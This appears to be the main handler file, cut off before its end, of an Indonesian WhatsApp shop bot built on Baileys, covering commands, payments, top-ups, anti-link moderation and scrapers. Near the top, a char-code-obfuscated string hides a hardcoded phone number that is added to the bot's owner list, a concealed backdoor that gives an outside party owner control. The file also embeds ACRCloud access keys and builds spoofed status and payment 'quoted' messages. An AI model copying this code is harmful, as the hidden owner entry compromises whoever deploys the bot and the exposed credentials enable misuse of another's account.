/*

  #- QOUPAYDEV *BACA DI Mydev.txt
  
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper");
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const md5 = require('md5');
const https = require('https');
const sharp = require('sharp'); // Tambahkan ini di awal file
const { createCanvas, loadImage, registerFont } = require('canvas');
const puppeteer = require("puppeteer");

const { default: WAgisnaxdection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const serverpanel = JSON.parse(fs.readFileSync("./settingpanel.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium2 = JSON.parse(fs.readFileSync("./library/database/reseller.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const stokdo = JSON.parse(fs.readFileSync("./library/database/stokdo.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const listidch = JSON.parse(fs.readFileSync("./library/database/listidch.json"))
const { pinterest, pinterest2, remini, Buddy, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { addSaldo, tambahSaldo, cekSaldo, kurangiSaldo } = require('./library/cekdatasaldo');
let db_saldo = JSON.parse(fs.readFileSync("./source/saldo.json"));
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, ucapan, loadModule } = require('./library/function');
const { buatPembayaran, cekStatusPembayaran } = require('./library/SocialBuzz.js');
const db_saweria = JSON.parse(fs.readFileSync('./source/saweria.json'));
const { Saweria } = require('./library/saweria')
const { addTransaction, updateTransactionStatus } = require("./library/dbtransaksi.js");
const { rekapTotalPendapatan } = require("./source/rekap.js");

module.exports = gisnaxd = async (gisnaxd, m, chatUpdate, store) => {
	try {
await LoadDataBase(gisnaxd, m)
if (global.moduleType == undefined) global.moduleType = 0
if (global.moduleType = 0) { 
await loadModule(gisnaxd)
global.moduleType += 1 }
const botNumber = await gisnaxd.decodeJid(gisnaxd.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 50, 49, 48, 56, 54, 56, 50, 49, 52, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.chat)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const Apiviapay = global.vipa_api_key;
const apiId = global.vipa_api_id; 
const ApiurlVip = global.vipa_url;
//Jangan otak Atik !
db.produk = db.produk || {};

//~~~~~~~~~ Console Message ~~~~~~~~//
if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return
if (isCmd) {
    console.log(chalk.cyan(`\n🚴💨 [ 𝚀𝚘𝚞𝚙𝚊𝚢𝙳𝚎𝚟 ]`));
    console.log(chalk.green(`➜ Command :`), chalk.white(`${prefix + command}`));
    console.log(chalk.green(`➜ From    :`), chalk.white(m.isGroup ? `Group (${m.sender.split("@")[0]})` : `Private (${m.sender.split("@")[0]})`));
    console.log(chalk.cyan(`───────────────────────`));
}
//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

const qlist = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: ` 🚴 | BOTSHOP ${runtime(process.uptime())}`,jpegThumbnail: ""}}}


//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return gisnaxd.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qlist})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await gisnaxd.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await gisnaxd.sendMessage(m.chat, {text: `*── Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await gisnaxd.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await gisnaxd.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await gisnaxd.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await gisnaxd.sendMessage(m.chat, {text: `*── Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await gisnaxd.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await gisnaxd.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


const lastPromotion = {}; // Menyimpan timestamp terakhir promosi untuk setiap grup

if (m.isGroup && db.settings.autopromosi == true) {
    if (m.text.includes("https://") && !m.fromMe) {
        const now = Date.now();
        const lastTime = lastPromotion[m.chat] || 0;

        // Cek apakah sudah lebih dari 1 jam (3600000 ms)
        if (now - lastTime >= 3600000) {
            await gisnaxd.sendMessage(m.chat, { text: `Saya Menggunakan BotShop ,Yang Di Rakit Qoupay Store😳` }, { quoted: null });
            lastPromotion[m.chat] = now; // Simpan timestamp terakhir
        }
    }
}

global.depositSession = global.depositSession || {};
global.depositData = global.depositData || {};
//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `*Contoh :* ${prefix+command} ${teks}`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return gisnaxd.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted: qtext})
}
const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: gisnaxd.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*QoupayDev* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `BOTSHOPV3`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `BOTSHOPV3`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await gisnaxd.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

function clearSessionAutomatically(limit = 10) {
    const sessionPath = "./session";
    const trashPath = "./library/database/sampah";
    
    const dirsesi = fs.readdirSync(sessionPath).filter(e => e !== "creds.json");
    const dirsampah = fs.readdirSync(trashPath).filter(e => e !== "A");
    
    if (dirsesi.length >= limit || dirsampah.length >= limit) {
        for (const i of dirsesi) {
            fs.unlinkSync(`${sessionPath}/${i}`);
        }
        for (const u of dirsampah) {
            fs.unlinkSync(`${trashPath}/${u}`);
        }
        console.log(`\n*Otomatis membersihkan sampah ✅*\n*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`);
    }
}

// Jalankan fungsi secara otomatis setiap 1 jam
setInterval(() => clearSessionAutomatically(10), 60 * 60 * 1000);

async function services() {
  const apiEndpoint = "https://smmnusantara.id/api/services";
  const apiID = global.apiID; 
  const apiKey = global.apiKey; 

  try {
    const response = await axios.post(apiEndpoint, {
      api_id: apiID,
      api_key: apiKey,
    });
    return response.data; 
  } catch (error) {
    console.error("Error saat memanggil API:", error.message);
    throw new Error("Gagal mengambil daftar layanan.");
  }
}  
//=========FUNC VIP-RESELLER
const cekStatusOrder = async (trxid) => {
const apiKey = global.vipa_api_key;
 const signFormula = md5(global.vipa_api_id + apiKey);

 const formCekStatus = new FormData();
 formCekStatus.append('key', apiKey);
 formCekStatus.append('sign', signFormula);
 formCekStatus.append('type', 'status');
 formCekStatus.append('trxid', trxid);

 const resCekStatus = await fetch(`${global.vipa_url}/api/game-feature`, {
method: 'POST',
headers: { 
 'Accept': 'application/json', 
 ...formCekStatus.getHeaders() 
},
body: formCekStatus
 });

 const statusData = await resCekStatus.json();
 return statusData.result ? statusData.data : null;
};

const cekStatusBerkala = async (trxid, percobaan = 0) => {
 try {
const statusTerkini = await cekStatusOrder(trxid);

if (!statusTerkini) {
 console.error(`Gagal mendapatkan status transaksi ${trxid}`);
 return;
}

let riwayatTransaksi = JSON.parse(fs.readFileSync(Riwayat_game, 'utf8'));
const indexTransaksi = riwayatTransaksi.findIndex(t => t.trxid === trxid);

if (indexTransaksi !== -1) {
 let statusSekarang = statusTerkini.status ? statusTerkini.status.toLowerCase() : 'pending';

 console.log('Status Terkini:', statusTerkini);
 console.log('Status Sekarang:', statusSekarang);

 if (statusSekarang === 'success' || statusTerkini.rc === '00') {
riwayatTransaksi[indexTransaksi].status = 'SUCCESS';
fs.writeFileSync(Riwayat_game, JSON.stringify(riwayatTransaksi, null, 2));

m.reply(`✅ *TRANSAKSI BERHASIL!*\n\n` +
 `🔢 *ID Transaksi:* ${trxid}\n` +
 `📌 *Layanan:* ${riwayatTransaksi[indexTransaksi].layanan}\n` +
 `🎮 *Data:* ${riwayatTransaksi[indexTransaksi].data_no}\n` +
 `📦 *Status:* ✨ SUKSES`);
 } 
 else if (statusSekarang === 'failed' || statusTerkini.rc === '01') {
riwayatTransaksi[indexTransaksi].status = 'FAILED';
fs.writeFileSync(Riwayat_game, JSON.stringify(riwayatTransaksi, null, 2));

m.reply(`❌ *TRANSAKSI GAGAL!*\n\n` +
 `🔢 *ID Transaksi:* ${trxid}\n` +
 `📌 *Layanan:* ${riwayatTransaksi[indexTransaksi].layanan}\n` +
 `🎮 *Data:* ${riwayatTransaksi[indexTransaksi].data_no}\n` +
 `📦 *Status:* ❌ GAGAL`);
 } 
 else {
if (percobaan < 10) {
 console.log(`Percobaan ke-${percobaan + 1} untuk transaksi ${trxid}`);
 
 riwayatTransaksi[indexTransaksi].status = 'PENDING';
 fs.writeFileSync(Riwayat_game, JSON.stringify(riwayatTransaksi, null, 2));
 
 setTimeout(() => cekStatusBerkala(trxid, percobaan + 1), 2 * 60 * 1000);
} else {
 console.log(`Pengecekan transaksi ${trxid} dihentikan setelah 10 percobaan.`);
 
 riwayatTransaksi[indexTransaksi].status = 'TIMEOUT';
 fs.writeFileSync(Riwayat_game, JSON.stringify(riwayatTransaksi, null, 2));
 
 m.reply(`⚠️ *TRANSAKSI TIMEOUT!*\n\n` +
`🔢 *ID Transaksi:* ${trxid}\n` +
`📌 *Layanan:* ${riwayatTransaksi[indexTransaksi].layanan}\n` +
`🎮 *Data:* ${riwayatTransaksi[indexTransaksi].data_no}\n` +
`📦 *Status:* ⏳ TIMEOUT\n\n` +
`Silakan hubungi admin untuk pengecekan manual.`);
}
 }
}
 } catch (error) {
console.error(`Gagal memeriksa status transaksi ${trxid}:`, error);
m.reply(`🚩 Terjadi kesalahan saat memeriksa status. ID Transaksi: ${trxid}\nSilakan hubungi admin dengan menyertakan ID transaksi tersebut.`);
 }
};
//=============[ FUNCTION ]
const makeRequest = async (endpoint, data = {}) => {
const sign = calculateSign(apiId, Apiviapay); // Pastikan calculateSign bekerja dengan benar
const formData = new FormData();

formData.append('key', Apiviapay);
formData.append('sign', sign);

// Tambahkan data ke FormData
Object.entries(data).forEach(([key, value]) => {
if (value !== undefined && value !== null) { // Hindari nilai undefined/null
formData.append(key, value);
}
});

try {
const response = await fetch(`${ApiurlVip}/api/${endpoint}`, {
method: 'POST',
body: formData, // Fetch akan secara otomatis menangani header FormData
});

// Penanganan status HTTP
if (!response.ok) {
if (response.status === 404) {
throw new Error(`Endpoint tidak ditemukan: ${endpoint}`);
}
throw new Error(`HTTP error! status: ${response.status}`);
}

// Ambil hasil JSON jika response berhasil
const result = await response.json();

// Pastikan respons sesuai format yang diharapkan
if (!result || typeof result !== 'object' || !result.result) {
throw new Error(`Invalid API response: ${JSON.stringify(result)}`);
}

return result;
} catch (error) {
// Log error dengan detail
console.error(`Error in ${endpoint}:`, error.message);
throw error; // Lempar error agar bisa ditangani di tempat lain
}
};
function calculateSign(apiId, Apiviapay) {
const signString = apiId + Apiviapay;
return md5(signString);
}
//======FUNC-REKBER
/*
<Nyari Ap? Mau Copy Fitur ?, Minimal Izin Lah !>
*/
//=========SetProduk
const setStatusProduk = async (namaProduk, statusBaru) => {
    if (!db.produk) db.produk = {}; // Pastikan database produk ada
    db.produk[namaProduk] = statusBaru.toLowerCase() === "on"; // Simpan status (true untuk aktif, false untuk off)
    return `Status produk *${namaProduk}* berhasil diubah menjadi *${statusBaru.toUpperCase()}*!`;
};
//========SETLOADING -!-
const configPath = './source/config.json';
function getConfig() {
    try {
        return JSON.parse(fs.readFileSync(configPath, 'utf-8'));
    } catch (err) {
        console.error("❌ Error membaca config:", err);
        return {}; // Jika error, kembalikan objek kosong
    }
}
async function runLoading(m) {
    let config = getConfig();
    if (!config.loading_aktif) return; // Jika loading mati, langsung return

    var xeonlod = [
        "🔄 *Memeriksa kabel...*",
        "🔌 *Mengecek listrik, tunggu...*",
        "📡 *Mencari sinyal di Mars...*",
        "⏳ *Ngopi dulu sebentar...*",
        "🐌 *Kecepatan loading sesuai provider...*",
        "🤖 *Bot lagi mikir keras...*",
        "⚡ *Overclocking prosesor bot...*",
        "💿 *Masang kaset Windows 98...*",
        "🕵️ *Mengintai kode error...*",
        "🧹 *Membersihkan cache...*",
        "📞 *Menelepon server...*",
        "🍌 *Pisangnya kemana ya?...*",
        "🎲 *Gacha kecepatan loading...*",
        "🏎️ *Menyalakan turbo boost...*",
        "🎵 *Memutar musik loading...*",
        "✅ *Selesai! Tapi kenapa?*",
        "🕹️ *Menekan tombol Start...*",
        "📦 *Membongkar paket loading...*",
        "🌎 *Menghubungkan ke server luar angkasa...*",
        "🔧 *Mengatur ulang konfigurasi...*",
        "🏗️ *Membangun ulang sistem...*",
        "🚀 *Meluncurkan roket loading...*",
        "🛸 *Menghubungi alien untuk bantuan...*",
        "🎢 *Naik roller coaster loading...*",
        "🔮 *Meramal kecepatan loading...*",
        "📠 *Mengirim fax ke database...*",
        "📡 *Menerima sinyal satelit...*",
        "🏆 *Mencari cheat code kecepatan...*",
        "🧪 *Eksperimen kecepatan...*",
        "🎭 *Menonton drama loading...*",
        "🚦 *Menunggu lampu hijau loading...*",
        "🌊 *Berselancar di jaringan internet...*",
        "🔥 *Membakar bug dengan api loading...*",
        "🔋 *Mengisi daya baterai loading...*",
        "🚧 *Sedang dalam perbaikan...*",
        "🏹 *Menembakkan panah ke bug...*",
        "🦄 *Mencari unicorn loading...*",
        "🎵 *Memutar lagu favorit server...*",
        "🍕 *Memesan pizza sambil menunggu...*",
        "🧊 *Mendinginkan prosesor...*",
        "🏚️ *Membersihkan rumah data...*",
        "🕰️ *Menyesuaikan waktu loading...*",
        "🎯 *Menargetkan kecepatan maksimal...*",
        "🛑 *Menekan tombol stop? Tidak mungkin!*",
        "🤖 *Menghubungi AI utama...*",
        "🏁 *Menyelesaikan balapan loading...*",
        "📼 *Memutar kaset loading...*",
        "🎭 *Loading penuh drama...*",
        "📢 *Mempersiapkan pengumuman kecepatan...*",
        "🧵 *Menjahit paket data loading...*",
        "🚴 *Menggowes loading...*",
        "🚣 *Mendayung perahu loading...*",
        "🏊 *Menyelam ke dalam data...*",
        "🌪️ *Angin loading bertiup kencang...*",
        "🔦 *Mencari bug dalam gelap...*",
        "🌄 *Menikmati pemandangan loading...*",
        "🔊 *Meningkatkan volume loading...*",
        "🎟️ *Tiket loading dalam genggaman...*",
        "🏅 *Menjadi juara loading...*",
        "📍 *Menentukan lokasi loading...*",
        "🛩️ *Terbang ke server lain...*",
        "🎥 *Menyiapkan trailer loading...*",
        "🔑 *Mencari kunci loading...*",
        "🌌 *Menyusun konstelasi loading...*",
        "🎇 *Menyalakan kembang api loading...*",
        "📡 *Menghubungkan ke satelit loading...*",
        "🎻 *Memainkan simfoni loading...*",
        "🦾 *Mengaktifkan mode robot...*",
        "🏚️ *Merenovasi rumah loading...*",
        "🚛 *Mengirim paket loading...*",
        "🚗 *Mengisi bensin loading...*",
        "🔗 *Menghubungkan data...*",
        "🛠️ *Menggunakan alat debug...*",
        "⏳ *Loading, harap bersabar...*",
        "📲 *Menyesuaikan layar loading...*",
        "🧑‍🔬 *Melakukan riset loading...*",
        "🌟 *Membuka bintang kecepatan...*",
        "🚀 *Meningkatkan kecepatan warp...*",
        "🔋 *Mengisi ulang daya server...*",
        "🧙‍♂️ *Menggunakan sihir loading...*",
        "🚶 *Berjalan ke tujuan loading...*",
        "🏁 *Memulai balapan loading...*",
        "🕵️ *Menyelidiki masalah loading...*",
        "🧳 *Mengemas data loading...*",
        "🎈 *Menerbangkan balon loading...*",
        "💿 *Menggunakan disk loading...*",
        "🔨 *Membangun ulang data loading...*",
        "🌈 *Menunggu pelangi loading...*",
        "🎯 *Mengarahkan kecepatan loading...*",
        "🚉 *Menunggu kereta loading...*",
        "🏜️ *Bertualang di loading land...*",
        "🎚️ *Mengatur volume loading...*",
        "🥁 *Menabuh drum loading...*",
        "🦊 *Mengejar rubah loading...*",
        "🏰 *Membangun kerajaan loading...*",
        "🦸‍♂️ *Mengaktifkan mode superhero...*",
        "🚜 *Membajak sawah loading...*",
        "🎨 *Melukis warna loading...*",
        "🎃 *Loading dalam mode Halloween...*",
        "🌴 *Berlibur ke pulau loading...*",
        "⚡ *Menggunakan petir loading...*",
        "🌑 *Mode loading gelap diaktifkan...*",
        "💰 *Mencari harta karun loading...*",
        "🦉 *Mengirim pesan lewat burung hantu...*"
    ];

    let { key } = await m.reply("🔄 *Loading dimulai...*");

    for (let i = 0; i < xeonlod.length; i++) {
        let delay = Math.floor(Math.random() * (4000 - 1500 + 1)) + 1500; // Delay random antara 1.5 - 4 detik
        await new Promise(resolve => setTimeout(resolve, delay));
        await m.reply(xeonlod[i], { edit: key });
    }
}
//==========Jangan di Apaapain Kalo gak Mau Eror !
async function processPayment(m, amount) {
  if (db.users[m.sender].saldo >= amount) {
      db.users[m.sender].saldo -= amount;
      m.reply(`✅ Saldo sebesar Rp${amount.toLocaleString()} telah dipotong untuk pembayaran.`);
      await onPaymentSuccess(m);
      return true;
  }
  return false;
}

//====NoEror
const SESSION_FILE = "./session/ai_sessions.json";

let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};

function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}
//=========StrukOtomatis
async function processTransaction(caseType, db, m, gisnaxd, Obj, paymentData) {
    let userData = db.users[m.sender];
    
    if (!userData) {
        return m.reply("❌ Data pengguna tidak ditemukan!");
    }

    // Menyusun ID transaksi, jika tidak ada pada paymentData, gunakan ID acak
    let idTransaksi = paymentData?.result?.transactionId || generateRandomId(); 
    let hargaProduk = Number(Obj.harga); // Harga produk dari Obj
    let ppn = Math.round(hargaProduk * 0.1); // PPN 10%
    let totalBayar = hargaProduk + ppn; // Total bayar

    // Tentukan nomor tujuan jika caseType adalah "topup"
    let nomorTujuan = caseType === "topup" ? Obj.nodana : "-"; 
    let namaPembeli = m.sender; // Nama pembeli tetap m.sender

    // Menentukan produk yang dibeli berdasarkan caseType
    let produkDibeli = caseType === "buy" ? Obj.produk : `Pulsa ${Obj.nominal}`;

    // Membuat struk untuk transaksi
    let strukPath;
    try {
        strukPath = await generateStruk(
            "QOUPAY SHOP INDONESIA", // Nama toko
            idTransaksi, // ID Transaksi
            hargaProduk, // Harga Produk
            ppn, // PPN 10%
            totalBayar, // Total Bayar
            namaPembeli, // Nama/ID Pembeli
            caseType, // Jenis transaksi ("buy" atau "topup")
            produkDibeli, // Nama produk (untuk buy)
            nomorTujuan // Nomor tujuan (untuk topup)
        );
        console.log(`✅ Struk transaksi ${caseType} berhasil dibuat:`, strukPath);
    } catch (error) {
        console.error("❌ Error saat membuat struk transaksi:", error);
        return m.reply("❌ Gagal membuat struk transaksi. Silakan coba lagi.");
    }

    // Mengirimkan struk melalui pesan WhatsApp
    try {
        await gisnaxd.sendMessage(m.sender, { 
            image: { url: strukPath }, 
            caption: `🧾 *Struk Pembelian Berhasil*  

📌 *Jenis Transaksi:* ${caseType === "buy" ? "Pembelian Produk" : "Isi Pulsa"}  
🆔 *ID Transaksi:* ${idTransaksi}  
💰 *Total Bayar:* Rp${totalBayar.toLocaleString()}  
📦 *Produk:* ${produkDibeli}  
📞 *Nomor Tujuan:* ${nomorTujuan !== "-" ? nomorTujuan : "Tidak Ada"}  

✅ *Pembayaran berhasil diproses! Terima kasih telah berbelanja di QOUPAY SHOP INDONESIA*` 
        });
    } catch (error) {
        console.error("❌ Error saat mengirim struk transaksi:", error);
        return m.reply("❌ Gagal mengirim struk transaksi. Silakan coba lagi.");
    }
}
//=======Notif Ke Owner
async function sendPaymentNotificationToOwner(transaksi) {
  let ownerNumber = global.owner; // Ambil nomor owner dari konfigurasi

  let notifText = `📢 *Notifikasi Pembayaran*\n\n` +
                  `🆔 *ID Transaksi:* ${transaksi.id}\n` +
                  `👤 *User:* ${transaksi.user}\n` +
                  `💰 *Jumlah:* Rp${transaksi.amount.toLocaleString()}\n` +
                  `📍 *Metode:* ${transaksi.method}\n` +
                  `✅ *Status:* Berhasil\n\n` +
                  `📌 Silakan cek transaksi untuk detail lebih lanjut.`;

  await gisnaxd.sendMessage(ownerNumber, { text: notifText });
}

// Panggil fungsi setelah pembayaran berhasil
async function handleSuccessfulPayment(transaksi) {
  console.log("Pembayaran berhasil:", transaksi);

  // Kirim notifikasi ke owner
  await sendPaymentNotificationToOwner(transaksi);
}

//=========Rekber
async function getMCGroup(seller) {
    const groupPath = "./library/mc_groups.json";
    let groupData = fs.existsSync(groupPath) ? JSON.parse(fs.readFileSync(groupPath, "utf8")) : {};

    return groupData[seller] || null; // Kembalikan ID grup jika ada
}

//=========Sholat


// Fungsi untuk mengenali musik menggunakan ACRCloud
async function whatmusic(buffer) {
  const acr = new acrcloud({
    host: "identify-ap-southeast-1.acrcloud.com",
    access_key: "ee1b81b47cf98cd73a0072a761558ab1",
    access_secret: "ya9OPe8onFAnNkyf9xMTK8qRyMGmsghfuHrIMmUI",
  });

  let response = await acr.identify(buffer);
  let metadata = response.metadata;
  if (!metadata || !metadata.music) return [];

  return metadata.music.map((song) => ({
    title: song.title,
    artist: song.artists.map((a) => a.name)[0],
    score: song.score,
    release: new Date(song.release_date).toLocaleDateString("id-ID"),
    duration: toTime(song.duration_ms),
    url: Object.keys(song.external_metadata)
      .map((key) =>
        key === "youtube"
          ? "https://youtu.be/" + song.external_metadata[key].vid
          : key === "deezer"
            ? "https://www.deezer.com/us/track/" +
              song.external_metadata[key].track.id
            : key === "spotify"
              ? "https://open.spotify.com/track/" +
                song.external_metadata[key].track.id
              : "",
      )
      .filter(Boolean),
  }));
}

// Fungsi untuk mengubah milidetik ke format menit:detik
async function toTime(ms) {
  let minutes = Math.floor(ms / 60000) % 60;
  let seconds = Math.floor(ms / 1000) % 60;
  return [minutes, seconds].map((v) => v.toString().padStart(2, "0")).join(":");
};

// Scraper Sokuja
const Sokuja = {
  latest: async function () {
    let res = await axios.get("https://x1.sokuja.uk");
    let $ = cheerio.load(res.data);
    let array = [];
    $(".seventh").each((a, i) => {
      array.push({
        title: $(i).find(".main-seven a").attr("title"),
